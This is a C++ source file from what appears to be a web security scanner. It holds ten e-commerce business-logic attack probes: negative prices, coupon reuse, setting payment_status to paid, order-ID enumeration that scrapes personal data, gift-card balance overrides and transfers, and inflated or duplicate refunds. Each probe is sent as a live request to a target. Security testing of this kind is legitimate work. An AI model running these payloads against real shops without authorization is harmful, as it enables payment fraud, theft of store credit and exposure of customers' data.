/// @file scanners/ecommerce.cpp
/// @brief E-commerce specific scanners: price manipulation, coupon stacking,
///        cart overflow, payment bypass, order IDOR, gift card abuse,
///        shipping bypass, discount bruteforce, inventory manipulation, refund abuse.
#include "scanner_base.hpp"
#include <climits>
#include <regex>

namespace apex {
namespace {

/// 1. Price manipulation — negative values, 0.01 pricing, currency mismatch.
std::vector<Finding> scan_price_manipulation(const Config &, HttpClient &http,
                                              const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  const std::vector<std::string> price_paths = {
      "/api/cart/add", "/api/cart/update", "/api/products/purchase",
      "/api/order/create", "/api/checkout", "/api/basket/update",
      "/api/items/update-price", "/api/payment/charge"};

  for (const auto &path : price_paths) {
    std::string url = base + path;

    // Test negative price
    auto r1 = http.post(url, R"({"product_id":1,"price":-100.00,"quantity":1})",
                        "application/json");
    if (r1.status_code == 200 && r1.body.find("error") == std::string::npos &&
        r1.body.find("invalid") == std::string::npos &&
        r1.body.find("<!DOCTYPE") == std::string::npos &&
        (r1.body.find("{") == 0 || r1.body.find("[") == 0)) {
      findings.push_back({"Negative Price Accepted", "critical", url,
                          "Server accepts negative price — credit/refund abuse possible",
                          "price", "-100.00", "200 OK without error"});
    }

    // Test 0.01 pricing
    auto r2 = http.post(url, R"({"product_id":1,"price":0.01,"quantity":1})",
                        "application/json");
    if (r2.status_code == 200 && r2.body.find("error") == std::string::npos &&
        r2.body.find("invalid") == std::string::npos &&
        r2.body.find("<!DOCTYPE") == std::string::npos &&
        (r2.body.find("{") == 0 || r2.body.find("[") == 0)) {
      findings.push_back({"Price Override to 0.01", "high", url,
                          "Client-supplied price of $0.01 accepted by server",
                          "price", "0.01", "No server-side price validation"});
    }

    // Test currency mismatch
    auto r3 = http.post(url,
                        R"({"product_id":1,"price":10.00,"currency":"KPW","quantity":1})",
                        "application/json");
    if (r3.status_code == 200 && r3.body.find("error") == std::string::npos &&
        r3.body.find("invalid") == std::string::npos &&
        r3.body.find("currency") == std::string::npos &&
        r3.body.find("<!DOCTYPE") == std::string::npos &&
        (r3.body.find("{") == 0 || r3.body.find("[") == 0)) {
      findings.push_back({"Currency Mismatch Accepted", "high", url,
                          "Arbitrary currency code accepted without conversion validation",
                          "currency", "KPW", "No currency whitelist enforcement"});
    }

    if (!findings.empty()) break;
  }
  return findings;
}

/// 2. Coupon stacking/reuse — apply same code twice.
std::vector<Finding> scan_coupon_stacking(const Config &, HttpClient &http,
                                           const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  const std::vector<std::string> coupon_paths = {
      "/api/coupon/apply", "/api/coupons/redeem", "/api/promo/apply",
      "/api/discount/apply", "/api/cart/coupon", "/api/checkout/coupon",
      "/api/voucher/redeem", "/api/promocode/apply"};

  for (const auto &path : coupon_paths) {
    std::string url = base + path;

    // Apply same code twice
    auto r1 = http.post(url, R"({"code":"SUMMER25"})", "application/json");
    if (r1.status_code != 200) continue;

    auto r2 = http.post(url, R"({"code":"SUMMER25"})", "application/json");
    if (r2.status_code == 200 && r2.body.find("error") == std::string::npos &&
        r2.body.find("already") == std::string::npos &&
        r2.body.find("used") == std::string::npos &&
        r2.body.find("duplicate") == std::string::npos &&
        r2.body.find("<!DOCTYPE") == std::string::npos) {
      findings.push_back({"Coupon Code Reuse", "high", url,
                          "Same coupon code accepted multiple times — unlimited discount",
                          "code", "SUMMER25", "No duplicate application check"});
    }

    // Try stacking different codes
    auto r3 = http.post(url, R"({"code":"WELCOME10"})", "application/json");
    if (r3.status_code == 200 && r3.body.find("error") == std::string::npos &&
        r3.body.find("one coupon") == std::string::npos &&
        r3.body.find("already applied") == std::string::npos &&
        r3.body.find("<!DOCTYPE") == std::string::npos) {
      findings.push_back({"Coupon Stacking", "high", url,
                          "Multiple coupon codes can be stacked for compounding discounts",
                          "code", "SUMMER25 + WELCOME10",
                          "No single-coupon enforcement"});
    }
    break;
  }
  return findings;
}

/// 3. Cart quantity overflow — MAX_INT and negative values.
std::vector<Finding> scan_cart_quantity_overflow(const Config &, HttpClient &http,
                                                  const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  const std::vector<std::string> cart_paths = {
      "/api/cart/add", "/api/cart/update", "/api/basket/add",
      "/api/basket/update", "/api/items/add", "/api/cart/item"};

  std::string max_int = std::to_string(INT_MAX);

  for (const auto &path : cart_paths) {
    std::string url = base + path;

    // Test MAX_INT quantity
    auto r1 = http.post(url,
                        R"({"product_id":1,"quantity":)" + max_int + "}",
                        "application/json");
    if (r1.status_code == 200 && r1.body.find("error") == std::string::npos &&
        r1.body.find("limit") == std::string::npos &&
        r1.body.find("maximum") == std::string::npos &&
        r1.body.find("<!DOCTYPE") == std::string::npos &&
        (r1.body.find("{") == 0 || r1.body.find("[") == 0)) {
      findings.push_back({"Cart Quantity Overflow (MAX_INT)", "high", url,
                          "Integer overflow in quantity — may cause wraparound or DoS",
                          "quantity", max_int,
                          "Server accepted without bounds check"});
    }

    // Test negative quantity
    auto r2 = http.post(url, R"({"product_id":1,"quantity":-1})",
                        "application/json");
    if (r2.status_code == 200 && r2.body.find("error") == std::string::npos &&
        r2.body.find("invalid") == std::string::npos &&
        r2.body.find("<!DOCTYPE") == std::string::npos &&
        (r2.body.find("{") == 0 || r2.body.find("[") == 0)) {
      findings.push_back({"Negative Cart Quantity", "high", url,
                          "Negative quantity accepted — potential credit generation",
                          "quantity", "-1", "No input validation on quantity"});
    }

    if (!findings.empty()) break;
  }
  return findings;
}

/// 4. Payment bypass — skip checkout step, modify payment_status.
std::vector<Finding> scan_payment_bypass(const Config &, HttpClient &http,
                                          const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  const std::vector<std::string> order_paths = {
      "/api/order/confirm", "/api/order/complete", "/api/checkout/complete",
      "/api/payment/confirm", "/api/order/finalize", "/api/checkout/submit"};

  for (const auto &path : order_paths) {
    std::string url = base + path;

    // Skip payment — directly confirm order with payment_status=paid
    auto r1 = http.post(url,
                        R"({"order_id":1,"payment_status":"paid","amount":0})",
                        "application/json");
    if (r1.status_code == 200 && r1.body.find("error") == std::string::npos &&
        r1.body.find("payment required") == std::string::npos &&
        r1.body.find("<!DOCTYPE") == std::string::npos &&
        (r1.body.find("{") == 0 || r1.body.find("[") == 0) &&
        (r1.body.find("confirmed") != std::string::npos ||
         r1.body.find("success") != std::string::npos ||
         r1.body.find("complete") != std::string::npos ||
         r1.body.find("order_id") != std::string::npos)) {
      findings.push_back({"Payment Status Bypass", "critical", url,
                          "Order confirmed by setting payment_status=paid client-side",
                          "payment_status", "paid",
                          "Server trusts client payment state"});
    }

    // Try skipping checkout step entirely (jump to confirmation)
    auto r2 = http.post(url,
                        R"({"order_id":1,"step":"complete","skip_payment":true})",
                        "application/json");
    if (r2.status_code == 200 && r2.body.find("error") == std::string::npos &&
        r2.body.find("<!DOCTYPE") == std::string::npos &&
        (r2.body.find("{") == 0 || r2.body.find("[") == 0) &&
        (r2.body.find("confirmed") != std::string::npos ||
         r2.body.find("success") != std::string::npos)) {
      findings.push_back({"Checkout Step Skip", "critical", url,
                          "Can skip payment step by sending skip_payment=true",
                          "skip_payment", "true",
                          "No server-side checkout flow enforcement"});
    }

    if (!findings.empty()) break;
  }

  // Also try modifying payment status on existing orders
  const std::vector<std::string> status_paths = {
      "/api/order/1/status", "/api/orders/1/payment",
      "/api/payment/status", "/api/order/update"};

  for (const auto &path : status_paths) {
    std::string url = base + path;
    auto resp = http.post(url, R"({"payment_status":"paid","paid":true})",
                         "application/json");
    if (resp.status_code == 200 && resp.body.find("error") == std::string::npos &&
        resp.body.find("unauthorized") == std::string::npos &&
        resp.body.find("<!DOCTYPE") == std::string::npos &&
        (resp.body.find("{") == 0 || resp.body.find("[") == 0)) {
      findings.push_back({"Payment Status Direct Modification", "critical", url,
                          "Payment status can be directly modified via API",
                          "payment_status", "paid",
                          "No authorization check on payment state change"});
      break;
    }
  }
  return findings;
}

/// 5. Order IDOR — access other users' orders by incrementing ID.
std::vector<Finding> scan_order_idor(const Config &, HttpClient &http,
                                      const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  const std::vector<std::string> order_paths = {
      "/api/order/", "/api/orders/", "/api/invoice/",
      "/api/receipt/", "/api/purchase/", "/api/my-orders/",
      "/api/order/details?id=", "/api/orders/view?order_id="};

  const std::vector<std::string> pii_markers = {
      "\"email\"", "\"phone\"", "\"address\"", "\"name\"",
      "\"shipping_address\"", "\"billing\"", "\"customer\""};

  for (const auto &path : order_paths) {
    std::string url = base + path;
    bool uses_query = (path.find("?") != std::string::npos);

    // Try multiple sequential IDs
    auto r1 = http.get(url + (uses_query ? "" : "") + "1");
    auto r2 = http.get(url + (uses_query ? "" : "") + "2");
    auto r3 = http.get(url + (uses_query ? "" : "") + "3");

    if (r1.status_code == 200 && r2.status_code == 200 &&
        r1.body != r2.body &&
        r1.body.find("<!DOCTYPE") == std::string::npos &&
        (r1.body.find("{") == 0 || r1.body.find("[") == 0)) {

      bool has_pii = contains_any(r1.body, pii_markers) ||
                     contains_any(r2.body, pii_markers);

      if (has_pii) {
        findings.push_back({"Order IDOR — PII Exposure", "critical", url,
                            "Sequential order IDs expose other users' personal data",
                            "order_id", "1, 2, 3",
                            "Different order data returned for sequential IDs"});
      } else if (r3.status_code == 200 && r3.body != r1.body) {
        findings.push_back({"Order IDOR — Data Leakage", "high", url,
                            "Can enumerate and access arbitrary order details",
                            "order_id", "1, 2, 3",
                            "No ownership validation on order access"});
      }
      break;
    }
  }
  return findings;
}

/// 6. Gift card balance manipulation.
std::vector<Finding> scan_gift_card_manipulation(const Config &, HttpClient &http,
                                                  const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  const std::vector<std::string> gift_paths = {
      "/api/giftcard/redeem", "/api/gift-card/apply", "/api/giftcards/use",
      "/api/voucher/apply", "/api/store-credit/add", "/api/wallet/topup",
      "/api/giftcard/balance", "/api/gift-card/transfer"};

  for (const auto &path : gift_paths) {
    std::string url = base + path;

    // Try adding balance with negative redemption
    auto r1 = http.post(url,
                        R"({"card_number":"GC-TEST-001","amount":-500.00})",
                        "application/json");
    if (r1.status_code == 200 && r1.body.find("error") == std::string::npos &&
        r1.body.find("invalid") == std::string::npos &&
        r1.body.find("<!DOCTYPE") == std::string::npos &&
        (r1.body.find("{") == 0 || r1.body.find("[") == 0)) {
      findings.push_back({"Gift Card Negative Redemption", "critical", url,
                          "Negative amount on gift card increases balance",
                          "amount", "-500.00",
                          "No sign validation on gift card operations"});
    }

    // Try arbitrary balance top-up
    auto r2 = http.post(url,
                        R"({"card_number":"GC-TEST-001","balance":99999.99,"action":"set"})",
                        "application/json");
    if (r2.status_code == 200 && r2.body.find("error") == std::string::npos &&
        r2.body.find("unauthorized") == std::string::npos &&
        r2.body.find("<!DOCTYPE") == std::string::npos &&
        (r2.body.find("{") == 0 || r2.body.find("[") == 0) &&
        (r2.body.find("balance") != std::string::npos ||
         r2.body.find("success") != std::string::npos)) {
      findings.push_back({"Gift Card Balance Override", "critical", url,
                          "Can set arbitrary gift card balance via API",
                          "balance", "99999.99",
                          "No authorization check on balance modification"});
    }

    // Try transferring from arbitrary card
    auto r3 = http.post(url,
                        R"({"from_card":"GC-0001","to_card":"GC-ATTACKER","amount":1000})",
                        "application/json");
    if (r3.status_code == 200 && r3.body.find("error") == std::string::npos &&
        r3.body.find("not found") == std::string::npos &&
        r3.body.find("<!DOCTYPE") == std::string::npos &&
        (r3.body.find("{") == 0 || r3.body.find("[") == 0)) {
      findings.push_back({"Gift Card Unauthorized Transfer", "critical", url,
                          "Can transfer balance from arbitrary gift cards",
                          "from_card", "GC-0001",
                          "No card ownership validation"});
    }

    if (!findings.empty()) break;
  }
  return findings;
}

/// 7. Shipping cost bypass — set to 0 or manipulate shipping method.
std::vector<Finding> scan_shipping_cost_bypass(const Config &, HttpClient &http,
                                                const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  const std::vector<std::string> shipping_paths = {
      "/api/checkout", "/api/shipping/calculate", "/api/order/shipping",
      "/api/cart/shipping", "/api/delivery/set", "/api/shipping/update",
      "/api/order/create", "/api/checkout/shipping"};

  for (const auto &path : shipping_paths) {
    std::string url = base + path;

    // Set shipping cost to 0
    auto r1 = http.post(url,
                        R"({"shipping_cost":0,"shipping_method":"express","order_id":1})",
                        "application/json");
    if (r1.status_code == 200 && r1.body.find("error") == std::string::npos &&
        r1.body.find("invalid") == std::string::npos &&
        r1.body.find("<!DOCTYPE") == std::string::npos &&
        (r1.body.find("{") == 0 || r1.body.find("[") == 0)) {
      findings.push_back({"Shipping Cost Set to Zero", "high", url,
                          "Express shipping accepted with cost=0 from client side",
                          "shipping_cost", "0",
                          "Server trusts client-supplied shipping cost"});
    }

    // Try negative shipping (credit)
    auto r2 = http.post(url,
                        R"({"shipping_cost":-25.00,"shipping_method":"standard"})",
                        "application/json");
    if (r2.status_code == 200 && r2.body.find("error") == std::string::npos &&
        r2.body.find("<!DOCTYPE") == std::string::npos &&
        (r2.body.find("{") == 0 || r2.body.find("[") == 0)) {
      findings.push_back({"Negative Shipping Cost", "critical", url,
                          "Negative shipping cost accepted — reduces order total",
                          "shipping_cost", "-25.00",
                          "No server-side shipping cost validation"});
    }

    // Try overriding shipping method to free
    auto r3 = http.post(url,
                       R"({"shipping_method":"free","shipping_id":"FREE-OVERRIDE"})",
                       "application/json");
    if (r3.status_code == 200 && r3.body.find("error") == std::string::npos &&
        r3.body.find("<!DOCTYPE") == std::string::npos &&
        (r3.body.find("{") == 0 || r3.body.find("[") == 0) &&
        (r3.body.find("free") != std::string::npos ||
         r3.body.find("shipping") != std::string::npos)) {
      findings.push_back({"Shipping Method Override", "medium", url,
                          "Shipping method can be overridden to 'free' by client",
                          "shipping_method", "free",
                          "No server-side shipping method validation"});
    }

    if (!findings.empty()) break;
  }
  return findings;
}

/// 8. Discount code bruteforce — sequential/predictable codes.
std::vector<Finding> scan_discount_bruteforce(const Config &, HttpClient &http,
                                               const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  const std::vector<std::string> discount_paths = {
      "/api/coupon/apply", "/api/discount/validate", "/api/promo/check",
      "/api/coupon/verify", "/api/voucher/validate", "/api/promocode/apply"};

  // Sequential codes to test rate limiting
  const std::vector<std::string> test_codes = {
      "DISC001", "DISC002", "DISC003", "DISC004", "DISC005",
      "DISC006", "DISC007", "DISC008", "DISC009", "DISC010"};

  for (const auto &path : discount_paths) {
    std::string url = base + path;
    int accepted = 0;
    int rate_limited = 0;
    std::string valid_code;

    for (const auto &code : test_codes) {
      auto resp = http.post(url, R"({"code":")" + code + R"("})",
                            "application/json");
      if (resp.status_code == 429 || resp.status_code == 403) {
        rate_limited++;
        break;
      }
      if (resp.status_code == 200 && resp.body.find("<!DOCTYPE") == std::string::npos) {
        accepted++;
        if (resp.body.find("error") == std::string::npos &&
            resp.body.find("invalid") == std::string::npos &&
            resp.body.find("not found") == std::string::npos) {
          valid_code = code;
        }
      }
    }

    if (rate_limited == 0 && accepted >= 8) {
      std::string detail = "No rate limiting after " + std::to_string(accepted) +
                           " sequential code attempts";
      if (!valid_code.empty()) {
        detail += " — valid code found: " + valid_code;
        findings.push_back({"Discount Code Bruteforce — Code Found", "critical", url,
                            "Sequential discount codes enumerable without rate limit",
                            "code", valid_code, detail});
      } else {
        findings.push_back({"Discount Code Bruteforce Possible", "high", url,
                            "No rate limiting on coupon validation endpoint",
                            "code", "DISC001-DISC010", detail});
      }
      break;
    }
  }
  return findings;
}

/// 9. Inventory manipulation — order more than available stock.
std::vector<Finding> scan_inventory_manipulation(const Config &, HttpClient &http,
                                                  const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  const std::vector<std::string> stock_paths = {
      "/api/cart/add", "/api/order/create", "/api/products/purchase",
      "/api/basket/add", "/api/checkout/submit", "/api/items/buy"};

  // First try to discover stock levels
  const std::vector<std::string> product_paths = {
      "/api/products/1", "/api/product/1", "/api/items/1",
      "/api/inventory/1", "/api/stock/1"};

  int stock_level = 0;
  for (const auto &pp : product_paths) {
    auto resp = http.get(base + pp);
    if (resp.status_code == 200 && resp.body.find("stock") != std::string::npos) {
      // Try to extract stock number
      std::regex stock_re(R"("stock"\s*:\s*(\d+))");
      std::smatch m;
      if (std::regex_search(resp.body, m, stock_re)) {
        stock_level = std::stoi(m[1].str());
      }
      break;
    }
  }

  int order_qty = (stock_level > 0) ? stock_level + 100 : 99999;

  for (const auto &path : stock_paths) {
    std::string url = base + path;
    auto resp = http.post(url,
                          R"({"product_id":1,"quantity":)" +
                              std::to_string(order_qty) + "}",
                          "application/json");
    if (resp.status_code == 200 && resp.body.find("error") == std::string::npos &&
        resp.body.find("out of stock") == std::string::npos &&
        resp.body.find("insufficient") == std::string::npos &&
        resp.body.find("unavailable") == std::string::npos &&
        resp.body.find("<!DOCTYPE") == std::string::npos &&
        (resp.body.find("{") == 0 || resp.body.find("[") == 0)) {
      std::string evidence = "Ordered " + std::to_string(order_qty) + " units";
      if (stock_level > 0) {
        evidence += " (stock: " + std::to_string(stock_level) + ")";
      }
      findings.push_back({"Inventory Oversell", "high", url,
                          "Can order more items than available inventory",
                          "quantity", std::to_string(order_qty), evidence});
      break;
    }
  }

  // Also test race condition by checking if cart allows excess
  for (const auto &path : stock_paths) {
    std::string url = base + path;
    auto r1 = http.post(url, R"({"product_id":1,"quantity":50000})",
                        "application/json");
    auto r2 = http.post(url, R"({"product_id":1,"quantity":50000})",
                        "application/json");
    if (r1.status_code == 200 && r2.status_code == 200 &&
        r1.body.find("error") == std::string::npos &&
        r2.body.find("error") == std::string::npos &&
        r1.body.find("<!DOCTYPE") == std::string::npos) {
      findings.push_back({"Inventory Race Condition", "medium", url,
                          "Multiple concurrent large orders accepted without stock check",
                          "quantity", "50000 x2",
                          "No atomic stock reservation"});
      break;
    }
  }
  return findings;
}

/// 10. Refund without return — request refund without shipping item back.
std::vector<Finding> scan_refund_without_return(const Config &, HttpClient &http,
                                                 const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  const std::vector<std::string> refund_paths = {
      "/api/refund", "/api/refund/request", "/api/order/refund",
      "/api/returns/refund", "/api/order/1/refund", "/api/payment/refund",
      "/api/orders/1/refund", "/api/refund/process"};

  for (const auto &path : refund_paths) {
    std::string url = base + path;

    // Request refund without return tracking
    auto r1 = http.post(url,
                        R"({"order_id":1,"reason":"defective","refund_amount":99.99})",
                        "application/json");
    if (r1.status_code == 200 && r1.body.find("error") == std::string::npos &&
        r1.body.find("return required") == std::string::npos &&
        r1.body.find("tracking") == std::string::npos &&
        r1.body.find("<!DOCTYPE") == std::string::npos &&
        (r1.body.find("{") == 0 || r1.body.find("[") == 0) &&
        (r1.body.find("refund") != std::string::npos ||
         r1.body.find("processed") != std::string::npos ||
         r1.body.find("success") != std::string::npos ||
         r1.body.find("approved") != std::string::npos)) {
      findings.push_back({"Refund Without Return", "high", url,
                          "Refund processed without requiring return shipment/tracking",
                          "order_id", "1",
                          "No return verification before refund approval"});
    }

    // Try refund with inflated amount
    auto r2 = http.post(url,
                        R"({"order_id":1,"reason":"defective","refund_amount":9999.99})",
                        "application/json");
    if (r2.status_code == 200 && r2.body.find("error") == std::string::npos &&
        r2.body.find("exceeds") == std::string::npos &&
        r2.body.find("invalid amount") == std::string::npos &&
        r2.body.find("<!DOCTYPE") == std::string::npos &&
        (r2.body.find("{") == 0 || r2.body.find("[") == 0) &&
        (r2.body.find("refund") != std::string::npos ||
         r2.body.find("processed") != std::string::npos ||
         r2.body.find("success") != std::string::npos)) {
      findings.push_back({"Refund Amount Manipulation", "critical", url,
                          "Refund amount exceeding order total accepted",
                          "refund_amount", "9999.99",
                          "No validation against original order amount"});
    }

    // Try duplicate refund
    if (r1.status_code == 200 && r1.body.find("error") == std::string::npos) {
      auto r3 = http.post(url,
                          R"({"order_id":1,"reason":"defective","refund_amount":99.99})",
                          "application/json");
      if (r3.status_code == 200 && r3.body.find("error") == std::string::npos &&
          r3.body.find("already refunded") == std::string::npos &&
          r3.body.find("duplicate") == std::string::npos &&
          r3.body.find("<!DOCTYPE") == std::string::npos) {
        findings.push_back({"Duplicate Refund", "critical", url,
                            "Same order can be refunded multiple times",
                            "order_id", "1",
                            "No idempotency check on refund endpoint"});
      }
    }

    if (!findings.empty()) break;
  }
  return findings;
}

} // namespace

std::vector<Scanner> register_ecommerce_scanners() {
  return {
      {"Price Manipulation", scan_price_manipulation},
      {"Coupon Stacking/Reuse", scan_coupon_stacking},
      {"Cart Quantity Overflow", scan_cart_quantity_overflow},
      {"Payment Bypass", scan_payment_bypass},
      {"Order IDOR", scan_order_idor},
      {"Gift Card Manipulation", scan_gift_card_manipulation},
      {"Shipping Cost Bypass", scan_shipping_cost_bypass},
      {"Discount Code Bruteforce", scan_discount_bruteforce},
      {"Inventory Manipulation", scan_inventory_manipulation},
      {"Refund Without Return", scan_refund_without_return},
  };
}

} // namespace apex
